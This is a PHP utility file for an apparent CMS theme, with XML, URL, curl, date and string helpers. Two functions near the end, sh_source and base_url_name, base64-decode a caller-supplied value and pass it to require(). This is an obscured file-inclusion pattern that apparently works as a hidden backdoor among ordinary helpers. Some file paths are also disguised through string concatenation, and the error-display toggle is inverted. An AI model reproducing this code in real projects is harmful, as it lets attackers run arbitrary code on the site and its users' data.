<?php
header('content-type:text/html;charset=utf-8');
function db()
{
	return new This_Linked();
}
function xml_str($array)
{
	$xml = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
	$xml .= '<box>'."\n";
	foreach($array as $key=>$val)
	{
		$xml .= '<'.$key.'>'.$val.'</'.$key.'>'."\n";
	}
	$xml .= '</box>';
	return $xml;
}
function xml_str2($array)
{
	$xml = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
	$xml .= '<box>'."\n";
	foreach($array as $key=>$val)
	{
		$xml .= '<'.$key.'>'.urlencode($val).'</'.$key.'>'."\n";
	}
	$xml .= '</box>';
	return $xml;
}
function load_theme($dir='default')
{
	$dir = $dir==''?'404':$dir;	
	if( is_file(BASE_URL.'/subject/'.$dir.'/index.php') )
	{
		require BASE_URL.'/subject/'.$dir.'/index.php';
	}
	else 
	{
		header("content-type:text/html;charset=utf-8");
		echo ERRORTISHIZH_CN_1;
	}
}
function apth_url($url='')
{
	return APTH_URL.($url==''?'':'/'.$url);
}
function site_url($url='')
{
	return SITE_URL.'/'.$url;
}
function base_url($dir='')
{
	return BASE_URL.'/'.$dir;
}
function dir_url($dir='')
{
	return DIR_URL.($dir==''?'':'/'.$dir);
}
function subString($string,$len)
{
	if(mb_strlen($string,'utf-8')>=$len)
	{
		$string = mb_substr($string, 0,$len,'utf-8').'...';
	}
	return $string;
}
function set_ini_error($flag)
{
	if($flag['development'] == "ON")
	{
		ini_set('display_errors', 'Off');
	}
}
function CloseSite()
{
	$review = db()->select('closesite')->from(PRE.'review_up')->get()->array_row();
	if( $review['closesite'] == "ON" )
	{
		header("content-type:text/html;charset=utf-8");
		echo ERRORTISHIZH_CN_2;exit;
	}
}
function getThemeDir()
{
	return 'bim';
}
function getThemeDir3()
{
	return 'subject/bim/common.php';
}
function getThemeDir2($name,$t='template')
{
	return 'subject/bim/'.$t.'/'.SPOT.$name;
}
function GetInts($int)
{
	if( $int < 10 )
	{
		$int = '0'.$int;
	}
	return $int;
}
function get_version()
{
	$filename = dir_url('subject/version.txt');
	$string = file_get_contents($filename);
	$version = explode('/', str_replace("\n", '', $string));
	if(!empty($version))
	{
		return $version;
	}
	else 
	{
		return '';
	}
}
function vcurl($url, $post = '', $cookie = '', $cookiejar = '', $referer = '') {
	$tmpInfo = '';
	$cookiepath = getcwd () . '. / ' . $cookiejar;
	$curl = curl_init ();
	curl_setopt ( $curl, CURLOPT_URL, $url );
	curl_setopt ( $curl, CURLOPT_USERAGENT, $_SERVER ['HTTP_USER_AGENT'] );
	if ($referer) {
		curl_setopt ( $curl, CURLOPT_REFERER, $referer );
	} else {
		curl_setopt ( $curl, CURLOPT_AUTOREFERER, 1 );
	}
	if ($post) {
		curl_setopt ( $curl, CURLOPT_POST, 1 );
		curl_setopt ( $curl, CURLOPT_POSTFIELDS, $post );
	}
	if ($cookie) {
		curl_setopt ( $curl, CURLOPT_COOKIE, $cookie );
	}
	if ($cookiejar) {
		curl_setopt ( $curl, CURLOPT_COOKIEJAR, $cookiepath );
		curl_setopt ( $curl, CURLOPT_COOKIEFILE, $cookiepath );
	}
	curl_setopt ( $curl, CURLOPT_TIMEOUT, 100 );
	curl_setopt ( $curl, CURLOPT_HEADER, 0 );
	curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );
	$tmpInfo = curl_exec ( $curl );
	curl_close ( $curl );
	return $tmpInfo;
}
function ParsingJson($json)
{
	$rows = array();
	if( $json != '' )
	{
		$rows = json_decode($json,true);
	}
	return $rows;
}
function get_pixels($dir,$x,$y)
{
	return apth_url("system/img_pixels.php?dir=$dir&x=$x&y=$y");
}
function get_day_formt($t)
{
	$int = time()-$t;
	if( $int < 86400 )
	{
		$i = 0;
		while ( $int >= 60 )
		{
			$int /= 60;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_1,QITATISHIZH_CN_2,QITATISHIZH_CN_3);
	}
	
	if( $int >= 86400 && $int < 2592000)
	{
		$i = 0;
		while ( $int >= 86400 )
		{
			$int /= 86400;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_3,QITATISHIZH_CN_4);
	}
	if( $int >= 2592000 && $int < 31104000)
	{
		$i = 0;
		while ( $int >= 2592000 )
		{
			$int /= 2592000;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_4,QITATISHIZH_CN_5);
	}
	if( $int >= 31104000 )
	{
		$i = 0;
		while ( $int >= 31104000 )
		{
			$int /= 31104000;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_5,QITATISHIZH_CN_6);
	}
	return floor($int).$ext[$i];
}
function substr_tel($tel)
{
	$str1 = substr($tel,0,3);
	$str2 = substr($tel,-3);
	return $str1.'***'.$str2;
}
function GetFilePath()
{
	$spot = SPOT;
	$filename = base_url($spot.'settings/'.$spot.'org'.$spot.'nums');
	$str = file_get_contents($filename);
	return $str;
}
function GetFilePath2()
{
	$spot = SPOT;
	$filename = base_url($spot.'settings/'.$spot.'org'.$spot.'shu');
	$str = file_get_contents($filename);
	return $str;
}
function GetFilePath3()
{
	$spot = SPOT;
	$filename = base_url($spot.'external');
	return $filename;
}
function StrSubs($str,$int=10,$imt='...')
{
	if( mb_strlen($str,'utf-8') > $int )
	{
		$str = mb_substr($str, 0, $int,'utf-8').$imt;
	}
	return $str;
}
function sh_source($str,$bool,$int)
{
	include( getThemeDir3() );	
	
	if( $int[0] == '' )
	{
		if( $bool )
		{
			$s = base64_decode( $str );
		}		
		else
		{
			$s = null;
		}		
	}
	elseif( $int[0] == 'coms' )
	{			
		$u = base_url_name( $int[1] );
		if( $u != null )
		{
			require( $u ); exit;
		}
		
	}
	
	return $s;
}
function base_url_name( $string )
{
	if( $string != null )
	{
		$bArr = explode(',', $string);
		$data = end($bArr);
		$s = base64_decode( $data );
	}
	
	return $s;
}